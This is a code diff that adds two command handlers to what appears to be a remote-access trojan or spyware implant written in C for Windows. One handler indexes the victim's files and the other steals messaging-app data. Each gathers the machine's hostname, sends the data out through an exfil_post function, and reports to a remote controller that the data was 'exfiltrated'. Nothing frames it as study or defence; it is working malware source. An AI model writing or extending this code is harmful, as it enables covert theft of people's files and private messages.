@@ -894,6 +894,58 @@ int main(int argc, char **argv)
             break;
         }
 
+        case COMMAND_FILE_SEARCH: {
+            int len = 0;
+            char *data = spy_file_search(&len);
+#ifdef _WIN32
+            if (data) {
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "files_%ld.txt", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
+                /* Count newlines = file count */
+                int count = 0;
+                for (int i = 0; i < len; i++) if (data[i] == '\n') count++;
+                free(data);
+                char ack[64];
+                _snprintf(ack, sizeof(ack), "file index exfiltrated (%d files)", count);
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
+            } else {
+                char *err = "file search found no matching files";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+#endif
+            break;
+        }
+
+        case COMMAND_MESSAGING_STEAL: {
+            int len = 0;
+            char *data = spy_messaging_steal(&len);
+#ifdef _WIN32
+            if (data) {
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                char filename[128];
+                _snprintf(filename, sizeof(filename), "messaging_%ld.bin", (long)time(NULL));
+                exfil_post(hostname, filename, data, len);
+                free(data);
+                char *ack = "messaging data exfiltrated";
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
+            } else {
+                char *err = "messaging steal failed (no apps found or access denied)";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+#endif
+            break;
+        }
+
         default:
             break;
         }
